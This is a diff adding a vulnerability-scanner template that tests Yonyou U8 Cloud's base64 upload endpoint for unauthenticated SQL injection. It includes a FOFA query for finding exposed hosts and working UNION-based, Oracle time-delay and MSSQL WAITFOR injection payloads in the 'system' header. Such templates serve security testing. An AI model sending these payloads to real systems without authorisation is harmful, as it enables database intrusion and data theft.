@@ -1,0 +1,73 @@
+id: yonyou-u8-cloud-base64-sqli
+info:
+  name: 用友 U8 Cloud base64 - sqli
+  author: leadlife
+  severity: high
+  description: 用友U8 Cloud base64接口处存在SQL注入漏洞，未授权的攻击者可通过此漏洞获取数据库权限，从而盗取用户数据，造成用户信息泄露。
+  reference: 
+    - https://blog.csdn.net/qq_41904294/article/details/136690400
+    - https://wiki.wy876.cn/#/%E7%94%A8%E5%8F%8BU8_Cloud-base64%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E
+  metadata:
+    verified: true
+    fofa-query: app="用友-U8-Cloud" || title=="U8C"
+  tags: yonyou,sqli,u8cloud,oa,time
+
+http:
+  - raw:
+      - |
+        POST /u8cloud/api/file/upload/base64 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        system: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(106)+CHAR(120)+CHAR(112)+CHAR(113)+ISNULL(CAST(111*111 AS VARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(120)+CHAR(113)+CHAR(120)+CHAR(113),NULL-- QIwq
+        trantype: pk
+        isEncrypt: N
+        sign: token
+        Connection: close
+
+    matchers:
+      - type: dsl
+        name: mssql bind 
+        dsl:
+          - contains_all(body_1,'12321','errorcode')
+
+  - raw:
+      - |
+        @timeout: 15s
+        POST /u8cloud/api/file/upload/base64 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        system: 1' AND 6454=DBMS_PIPE.RECEIVE_MESSAGE(CHR(75)||CHR(84)||CHR(65)||CHR(112),6)-- sfce
+        trantype: pk
+        isEncrypt: N
+        sign: token
+        Connection: close
+
+    matchers:
+      - type: dsl
+        name: oracle
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+          - contains_all(body,'status','errorcode')
+        condition: and
+  
+  - raw:
+      - |
+        @timeout: 15s
+        POST /u8cloud/api/file/upload/base64 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        system: 1';WAITFOR DELAY '0:0:6'--'
+        trantype: pk
+        isEncrypt: N
+        sign: token
+        Connection: close  
+
+    matchers:
+      - type: dsl
+        name: mssql
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+          - contains_all(body,'status','errorcode')
+        condition: and
